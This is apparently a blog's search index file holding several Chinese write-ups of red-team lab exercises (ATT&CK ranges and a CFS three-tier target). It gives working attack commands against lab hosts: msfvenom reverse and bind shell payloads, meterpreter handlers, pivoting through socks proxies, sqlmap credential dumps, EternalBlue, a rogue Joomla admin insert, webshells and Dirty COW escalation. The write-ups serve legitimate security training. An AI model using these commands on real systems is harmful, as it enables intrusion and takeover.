<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ATT—CK红队评估实战内网靶场4</title>
    <link href="/2024/11/14/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA4/"/>
    <url>/2024/11/14/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA4/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">ubuntu:</span>ubuntu域成员机器<br><span class="hljs-symbol">douser:</span>Dotest123DC:<br><span class="hljs-symbol">administrator:</span>Test2008<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p>参考</p><p><a href="https://www.freebuf.com/articles/web/340783.html">ATT&amp;CK红队评估（红日靶场四） - FreeBuf网络安全行业门户</a></p><p><a href="https://mp.weixin.qq.com/s/dUMqk9FgRtasJgpjTRXksQ">ATT&amp;CK实战系列-红队评估 （六）Vulnstack靶场内网域渗透 (qq.com)</a></p><p><a href="https://www.cnblogs.com/itchen-2002/p/18412801/to-8tqri">ATT&amp;CK红队评估（红日靶场4） - itchen-2002 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CFS三层靶机</title>
    <link href="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/"/>
    <url>/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>密码均为：teamssix.com，拓扑如下</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241113213504275.png" alt="image-20241113213504275"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">Target1_CentOS7<br>宝塔后台登陆地址及密码：<br>地址：http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.129</span>:<span class="hljs-number">8888</span><span class="hljs-regexp">/a768f109/</span><br>账号：eaj3yhsl<br>密码：<span class="hljs-number">41</span>bb8fee<br></code></pre></td></tr></table></figure><p>添加自动分配ip的80端口，他这里的网站是宝塔搭建的，绑定的是原靶机的ip和端口，靶机又没固定ip，所以我们能访问ip的8888端口，不能访问80端口</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241113212119038.png" alt="image-20241113212119038"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">Target2_Ubuntu<br>宝塔后台登陆地址及密码：<br>地址：http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">22.129</span>:<span class="hljs-number">8888</span><span class="hljs-regexp">/2cc52ec0/</span><br>账号：xdynr37d<br>密码：<span class="hljs-number">123</span>qwe..<br></code></pre></td></tr></table></figure><p>同上</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241113212714118.png" alt="image-20241113212714118"></p><p>配置好后取消-将主机虚拟适配器连接到此网络，这样主机就不能访问内网22和33</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241113212913268.png" alt="image-20241113212913268"></p><p>配置好后及时保存快照</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241113214445386.png" alt="image-20241113214445386"></p><p>21、22、3306端口开放，可以考虑hydra爆破看是否存在弱密码，但这里有80端口，先打开网站看看</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241113215111675.png" alt="image-20241113215111675"></p><p>扫了下目录，发现flag1</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241113215622496.png" alt="image-20241113215622496"></p><p>thinkphp网站，上工具</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241113215058445.png" alt="image-20241113215058445"></p><p>发现数据库泄露账户密码，但显示127.0.0.1，还是尝试以下，不出意外远程连不上，但是还有rce</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241113220231920.png" alt="image-20241113220231920"></p><p>这里直接使用工具的getshell,会在网站根目录下生成一个密码peiqi的peiqi.php一句话木马</p><p>连上以后，在网站根目录下发现flag2</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241113220309813.png" alt="image-20241113220309813"></p><p>靶机根路径发现flag3</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241113220339014.png" alt="image-20241113220339014"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>centos查看网络，发现内网192.168.22.0/24</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114121443406.png" alt="image-20241114121443406"></p><p>上传木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.1.128 <span class="hljs-attribute">LPORT</span>=4444 -f elf &gt; 4444.elf<br></code></pre></td></tr></table></figure><p>msf连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.1.128<br><span class="hljs-built_in">set</span> LPORT 4444<br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114173916201.png" alt="image-20241114173916201"></p><p>添加路由</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute -s 192.168.22.0/24<br><span class="hljs-built_in">run</span> autoroute -p<br></code></pre></td></tr></table></figure><p>挂起，并开启代理</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> SRVHOST <span class="hljs-comment">192.168.1.128</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SRVPORT 1080</span><br>exploit<br></code></pre></td></tr></table></figure><p>vim /etc/proxychains4.conf </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socks5</span> <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><p>或者上传fscan，扫描内网,建议用fscan,msf代理太不稳定了</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114152638408.png" alt="image-20241114152638408"></p><p>nmap扫描结果</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114154246381.png" alt="image-20241114154246381"></p><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><p>访问192.168.22.129:80,存在sql注入</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114160507450.png" alt="image-20241114160507450"></p><p>可以sqlmap不能直接getshell,但是一跑sqlmap，shell连接直接断了，nmap都还没崩，只是超时，建议手工注入，得到账户密码后台登录，也可以爆破账户密码，毕竟是root:123qwe</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114160708723.png" alt="image-20241114160708723"></p><p>登录得到flag1，后台模板修改，注入webshell</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114172049680.png" alt="image-20241114172049680"></p><p>蚁剑连接后在网站根目录和靶机根目录得到flag2和flag3</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114172115717.png" alt="image-20241114172115717"></p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114172133725.png" alt="image-20241114172133725"></p><p>查看内网</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114172306710.png" alt="image-20241114172306710"></p><p>fscan扫描</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114172358920.png" alt="image-20241114172358920"></p><p>生成木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; ubuntu.elf<br></code></pre></td></tr></table></figure><p>msf连接ubuntu</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhost 192.168.22.129<br><span class="hljs-built_in">set</span> LPORT 3333<br>run<br></code></pre></td></tr></table></figure><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114172731106.png" alt="image-20241114172731106"></p><p>发现内网192.168.33/24，同样添加路由</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute -s 192.168.33.0/24<br><span class="hljs-built_in">run</span> autoroute -p<br></code></pre></td></tr></table></figure><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114172843735.png" alt="image-20241114172843735"></p><h2 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h2><p>扫描是否存在永恒之蓝</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span>  auxiliary/scanner/smb/smb_ms17_010 <br><span class="hljs-keyword">set</span> RHOSTS 192.168.33.33<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114181104381.png" alt="image-20241114181104381"></p><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> RHOSTS 192.168.33.33<br><span class="hljs-built_in">set</span> LPORT 4444<br>run<br></code></pre></td></tr></table></figure><p>还是代理原因，一直不成功，最好的一次打成蓝屏了</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114205930633.png" alt="image-20241114205930633"></p><p>将win7加到kali同一网段，成功，应该就是代理的问题，建议使用frps代理，</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241114215129714.png" alt="image-20241114215129714"></p><p>后面用frps代理</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 爆一下数据库名称</span><br>proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword <span class="hljs-params">--dbs</span><br>或<br>sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> <span class="hljs-params">--proxy=socks5</span>:<span class="hljs-string">//192.168.236.128</span><span class="hljs-function">:2222</span> -p keyword <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span><br><span class="hljs-comment"># 爆破 bagecms 库下的表</span><br>proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword -D <span class="hljs-string">&quot;bagecms&quot;</span> <span class="hljs-params">--tables</span> T <span class="hljs-string">&quot;bage_admin&quot;</span> <span class="hljs-params">--batch</span><br><span class="hljs-comment"># 爆破 bage_admin 表的字段</span><br>proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword -D <span class="hljs-string">&quot;bagecms&quot;</span> -T <span class="hljs-string">&quot;bage_admin&quot;</span> <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span><br><span class="hljs-comment"># 把 admin的账号密码给 dump出来</span><br>proxychains4 sqlmap -u <span class="hljs-string">&quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword -D bagecms -T bage_admin -C username,password <span class="hljs-params">--dump</span><br><span class="hljs-comment"># 测试了--is-dba，不是高权限，那就不尝试--os-shell了</span><br></code></pre></td></tr></table></figure><p>sqlmap能正常跑了</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241115130720253.png" alt="image-20241115130720253"></p><p>nmap扫描win7</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241115164952012.png" alt="image-20241115164952012"></p><p>msf也能正常打了</p><p><img src="/2024/11/13/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20241115165821213.png" alt="image-20241115165821213"></p><p>参考</p><p><a href="https://www.freebuf.com/articles/network/381892.html">【VulHub靶场】之CFS三层靶机内网渗透 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.cnblogs.com/1vxyz/p/17080748.html">CFS三层靶机-内网环境渗透 - 1vxyz - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/qq_61237064/article/details/125602997">CFS三层靶机搭建及其内网渗透_cfs三层内网渗透-CSDN博客</a></p><p><a href="https://www.cnblogs.com/9eek/p/16703300.html">打穿你的内网之三层内网渗透 - 9eek - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ATT—CK红队评估实战内网靶场3</title>
    <link href="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/"/>
    <url>/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶机解压打开都是挂起状态，直接打开即可</p><p>网络拓扑如下</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241107160822396.png" alt="image-20241107160822396"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241107161020935.png" alt="image-20241107161020935"></p><p>访问网站，发现是joomla，joomscan扫描</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">joomscan -u http:<span class="hljs-comment">//192.168.1.110</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241107160938646.png" alt="image-20241107160938646"></p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241107161004086.png" alt="image-20241107161004086"></p><p>查看配置文件，得到数据库账户密码</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241107161307982.png" alt="image-20241107161307982"></p><p>连上，找到数据库里的账户密码存放文件</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241107193849973.png" alt="image-20241107193849973"></p><p>搜索joomla管理员恢复密码，找到密码存放规则</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241107170319756.png" alt="image-20241107170319756"></p><p>sql执行添加管理员用户</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-symbol">`am2zu_users`</span> (<span class="hljs-symbol">`name`</span>, <span class="hljs-symbol">`username`</span>, <span class="hljs-symbol">`password`</span>, <span class="hljs-symbol">`params`</span>, <span class="hljs-symbol">`registerDate`</span>, <span class="hljs-symbol">`lastvisitDate`</span>, <span class="hljs-symbol">`lastResetTime`</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;Administrator2&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, NOW(), NOW(), NOW());<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-symbol">`am2zu_user_usergroup_map`</span> (<span class="hljs-symbol">`user_id`</span>,<span class="hljs-symbol">`group_id`</span>) <span class="hljs-keyword">VALUES</span> (LAST_INSERT_ID(),<span class="hljs-string">&#x27;8&#x27;</span>);<br></code></pre></td></tr></table></figure><p>登录，后台模板修改文件，</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241107180218490.png" alt="image-20241107180218490"></p><p>注入webshell</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241107180158077.png" alt="image-20241107180158077"></p><p>也可以使用cve-2021-23132 POC</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241107194209591.png" alt="image-20241107194209591"></p><p>蚁剑连接上后发现限制了命令执行，绕过disable_functions</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241107200327919.png" alt="image-20241107200327919"></p><p>发现是ubuntu主机，但是只有一个网卡，并且是内网ip</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241112154133134.png" alt="image-20241112154133134"></p><p>确定采用了反向代理</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241112154038600.png" alt="image-20241112154038600"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h2><p>在/tmp/mysql下发现ubuntu ssh账户密码</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241112154956438.png" alt="image-20241112154956438"></p><p>连上以后，SUID不能提权</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241112155403034.png" alt="image-20241112155403034"></p><p>Linux kernel =2.6.32  &gt; 2.6.22，在脏牛范围内，尝试脏牛提权</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241112161211186.png" alt="image-20241112161211186"></p><p>成功提权</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241112161115428.png" alt="image-20241112161115428"></p><p>msf生成linux马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.1.3 <span class="hljs-attribute">LPORT</span>=4444 -f elf &gt; a.elf<br></code></pre></td></tr></table></figure><p>上传到ubuntu，授权执行</p><p>msf开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x86/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.1.3<br><span class="hljs-built_in">set</span> LPORT 4444<br>exploit<br></code></pre></td></tr></table></figure><p>添加路由</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">route</span> add <span class="hljs-number">192.168.93.0</span> <span class="hljs-number">255.255.255.0</span> <span class="hljs-number">4</span>（id）<br><span class="hljs-attribute">route</span> print<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241112174122435.png" alt="image-20241112174122435"></p><p>earthworm搭建socks5反向代理服务</p><p>kali执行</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./ew_for_linux64</span> <span class="hljs-string">-s</span> <span class="hljs-string">rcsocks</span> <span class="hljs-string">-l</span> <span class="hljs-number">1080</span> <span class="hljs-string">-e</span> <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>CentOS执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./ew_for_linux64 -s rssocks -d 192.168.1.3   -e 1234<br></code></pre></td></tr></table></figure><p>扫描内网主机存活</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use auxiliary/scanner/discovery/udp_probe<br><span class="hljs-built_in">set</span> rhosts 192.168.93.0/24<br><span class="hljs-built_in">set</span> threads 5<br>run<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[+] <span class="hljs-title class_">Discovered</span> <span class="hljs-variable constant_">DNS</span> on <span class="hljs-number">192.168</span>.<span class="hljs-number">93.10</span><span class="hljs-symbol">:</span><span class="hljs-number">53</span> (<span class="hljs-title class_">Microsoft</span> <span class="hljs-variable constant_">DNS</span>)<br>[+] <span class="hljs-title class_">Discovered</span> <span class="hljs-title class_">Net</span>BIOS on <span class="hljs-number">192.168</span>.<span class="hljs-number">93.10</span><span class="hljs-symbol">:</span><span class="hljs-number">137</span> (<span class="hljs-variable constant_">WIN</span>-8<span class="hljs-symbol">GA56TNV3MV:</span>&lt;<span class="hljs-number">20</span>&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:WIN-</span>8<span class="hljs-symbol">GA56TNV3MV:</span>&lt;<span class="hljs-number">00</span>&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:TEST</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">00</span>&gt;<span class="hljs-symbol">:G</span> <span class="hljs-symbol">:TEST</span><span class="hljs-symbol">:&lt;</span>1c&gt;<span class="hljs-symbol">:G</span> <span class="hljs-symbol">:TEST</span><span class="hljs-symbol">:&lt;</span>1b&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span>0<span class="hljs-symbol">c:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span>1<span class="hljs-symbol">f:</span><span class="hljs-number">54</span><span class="hljs-symbol">:d2</span>)<br>[+] <span class="hljs-title class_">Discovered</span> <span class="hljs-variable constant_">NTP</span> on <span class="hljs-number">192.168</span>.<span class="hljs-number">93.10</span><span class="hljs-symbol">:</span><span class="hljs-number">123</span> (1c0104fa00000000000a04034c4f434ceaddc1712b4a82dbc54f234b71b152f3eaddc1758f63164feaddc1758f63164f)<br>[+] <span class="hljs-title class_">Discovered</span> <span class="hljs-variable constant_">MSSQL</span> on <span class="hljs-number">192.168</span>.<span class="hljs-number">93.20</span><span class="hljs-symbol">:</span><span class="hljs-number">1434</span> (<span class="hljs-title class_">ServerName</span>=<span class="hljs-variable constant_">WIN2008</span> <span class="hljs-title class_">InstanceName</span>=<span class="hljs-variable constant_">MSSQLSERVER</span> <span class="hljs-title class_">IsClustered</span>=<span class="hljs-title class_">No</span> <span class="hljs-title class_">Version</span>=<span class="hljs-number">10.0</span>.<span class="hljs-number">1600.22</span> tcp=<span class="hljs-number">1433</span> )<br>[+] <span class="hljs-title class_">Discovered</span> <span class="hljs-title class_">Net</span>BIOS on <span class="hljs-number">192.168</span>.<span class="hljs-number">93.20</span><span class="hljs-symbol">:</span><span class="hljs-number">137</span> (<span class="hljs-variable 